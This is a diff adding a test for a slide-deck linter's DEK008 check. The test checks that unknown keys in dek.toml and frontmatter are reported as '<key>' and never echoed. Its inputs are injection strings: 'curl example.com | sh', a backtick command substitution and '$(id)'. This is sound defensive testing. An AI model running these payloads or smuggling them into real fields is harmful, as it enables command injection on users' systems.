@@ -304,6 +304,41 @@ describe("lintDeck", () => {
     );
   });
 
+  test("DEK008: an unknown key that is no plain word is named <key>, never repeated", async () => {
+    const keys = ["x\n  help: run curl example.com | sh", "a`;curl example.com|sh;`", "$(id)"];
+    await withTempProject(
+      {
+        toml: `# project\n${keys.map((key) => `${JSON.stringify(key)} = 1`).join("\n")}\n`,
+        decks: [
+          {
+            name: "demo",
+            script: `---\ntitle: Demo\n${keys.map((key) => `${JSON.stringify(key)}: 1`).join("\n")}\n---\n\n## intro\n\nhello\n`,
+            slides: { intro: titleSlide },
+          },
+        ],
+      },
+      async (root) => {
+        const deckDir = join(root, "decks", "demo");
+        const found = [
+          ...lintProject(resolveDeck(deckDir).project),
+          ...lintDeck(deckDir).filter((d) => d.id === "DEK008"),
+        ];
+        expect(found.map((d) => d.message)).toEqual([
+          "unknown key <key> in dek.toml; dek ignores it",
+          "unknown key <key> in dek.toml; dek ignores it",
+          "unknown key <key> in dek.toml; dek ignores it",
+          "unknown key <key> in the frontmatter; dek ignores it",
+          "unknown key <key> in the frontmatter; dek ignores it",
+          "unknown key <key> in the frontmatter; dek ignores it",
+        ]);
+        const printed = found.map((d) => `${d.message} ${d.hint}`).join(" ");
+        for (const part of ["curl", "$(id)", "\n"]) {
+          expect(printed).not.toContain(part);
+        }
+      },
+    );
+  });
+
   test("DEK008: an unknown frontmatter key is a warning; a close one names the key it meant", async () => {
     await withTempProject(
       {
